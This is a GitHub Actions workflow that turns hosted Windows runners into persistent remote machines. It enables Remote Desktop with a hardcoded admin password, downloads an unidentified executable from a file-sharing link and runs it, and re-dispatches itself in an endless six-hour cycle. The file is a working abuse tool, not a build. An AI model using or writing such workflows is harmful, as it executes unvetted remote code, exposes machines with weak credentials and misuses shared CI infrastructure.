name: last

on:
  push:
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    steps:
      - name: Enable TS
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0

      - name: Enable Firewall Rule
        run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: Set User Authentication
        run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 1

      - name: Set Runner Admin Password
        run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)

      - name: Download Batch File
        run: Invoke-WebRequest -Uri "https://sharedby.blomp.com/qkOKD6" -OutFile run.exe

      - name: Execute Batch File
        run: |
          Start-Process -FilePath "run.exe"
          while ($true) {
              if (Get-Process | Where-Object { $_.ProcessName -eq "run" }) {
                  Write-Host "Process is running. Keeping alive..."
              } else {
                  Write-Host "Process has exited. Exiting loop..."
                  break
              }
              Start-Sleep -Seconds 60
          }

      - name: Keep Workflow Alive (Max Uptime)
        run: |
          Write-Host "Keeping the workflow alive..."
          $end = Get-Date
          $end = $end.AddHours(6)  # Max 6 hours for public repos
          while ($true) {
              if ((Get-Date) -gt $end) {
                  Write-Host "Time limit reached. Exiting loop to trigger restart..."
                  break
              }
              Write-Host "Workflow is alive. Sleeping for 60 seconds."
              Start-Sleep -Seconds 60
          }

  restart:
    needs: build
    runs-on: ubuntu-latest
    if: always()
    steps:
      - name: Re-dispatch Workflow
        uses: actions/github-script@v6
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            const workflow_id = 'last.yml'; // Adjust to your workflow filename or ID
            const ref = 'main'; // Branch to trigger
            await github.rest.actions.createWorkflowDispatch({
              owner: context.repo.owner,
              repo: context.repo.repo,
              workflow_id,
              ref,
            });
